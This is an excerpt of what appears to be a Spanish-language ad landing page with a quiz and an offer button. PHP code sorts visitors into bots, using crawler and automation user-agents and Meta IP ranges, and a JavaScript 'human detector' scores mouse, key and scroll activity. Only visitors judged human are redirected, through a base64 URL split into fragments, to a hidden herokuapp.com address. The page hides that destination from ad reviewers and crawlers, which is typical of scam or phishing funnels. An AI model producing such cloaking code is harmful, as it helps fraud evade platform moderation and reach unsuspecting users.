...
$botPatterns = array(
    ...
    'facebookbot','whatsapp','instagram',
    'googlebot','adsbot-google','google-inspectiontool','mediapartners-google',
    'bingbot','slurp','duckduckbot','baiduspider','yandex',
    'twitterbot','linkedinbot','pinterest','tiktokbot','bytespider',
    'ahrefsbot','semrushbot','mj12bot','dotbot','petalbot',
    'headlesschrome','phantomjs','puppeteer','playwright','selenium',
    'crawler','spider','bot/','http_request','curl/','wget/','python-requests','go-http-client'
);
$isBot = false;
foreach ($botPatterns as $p) { if (strpos($ua, $p) !== false) { $isBot = true; break; } }
if (!$isBot && strlen($ua) < 25) { $isBot = true; }
$metaIpPrefixes = array('66.220.','69.63.','69.171.','31.13.','157.240.','173.252.','199.201.6','204.15.20','102.132.','185.60.');
if (!$isBot) {
    foreach ($metaIpPrefixes as $pre) { if (strpos($ip, $pre) === 0) { $isBot = true; break; } }
}
?>
<!doctype html>
<html lang="es">
  ...
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    ...
    .papaya .pulpa {
      ...
      border-radius: 10px;
      background: linear-gradient(135deg, #2d4a8a, #4a6fb8);
...
<body>
  ...
  <main>
    ...
    <section class="results screen" id="screen-results">
      ...
      <div class="card-offer">
        ...
        <a href="javascript:void(0)" class="btn-cta" id="btn-final" role="button">Solicitar Ahora</a>
  ...
  <script>
    (function () {
      // === Detector de humano ===
      var __h = { mv: 0, tp: 0, kb: 0, sc: 0, fc: 0, t0: Date.now() };
      function bump(k){ return function(e){ if (e && e.isTrusted) __h[k]++; }; }
      document.addEventListener('mousemove', bump('mv'), { passive: true });
      document.addEventListener('touchstart', bump('tp'), { passive: true });
      document.addEventListener('touchmove',  bump('tp'), { passive: true });
      document.addEventListener('keydown',    bump('kb'), { passive: true });
      document.addEventListener('scroll',     bump('sc'), { passive: true });
      document.addEventListener('focusin', function(e){ if (e.isTrusted) __h.fc++; });

      function humanScore() {
        var dt = (Date.now() - __h.t0) / 1000;
        var pointer = __h.mv + __h.tp;
        var checks = 0;
        if (dt > 8) checks++;                 // tiempo en página
        if (pointer > 6) checks++;            // movimiento real
        if (__h.kb > 3) checks++;             // teclas reales
        if (__h.sc > 2) checks++;             // scroll
        if (__h.fc > 1) checks++;             // foco en inputs
        return checks;
      }
      ...
      // === Botón final con human-gate ===
      var finalBtn = document.getElementById('btn-final');
      if (finalBtn) {
        finalBtn.addEventListener('click', function (e) {
          e.preventDefault();
          if (!e.isTrusted) return;
          if (humanScore() < 3) return;
          var p = ['aHR0cHM6Ly9h','Z3JpY29s','YXN0YWtlLTQy','YTRhZjM3NmQ5My5oZXJva3VhcHAuY29tLw=='];
          try { window.location.href = atob(p.join('')); } catch (_) {}
        });
      }
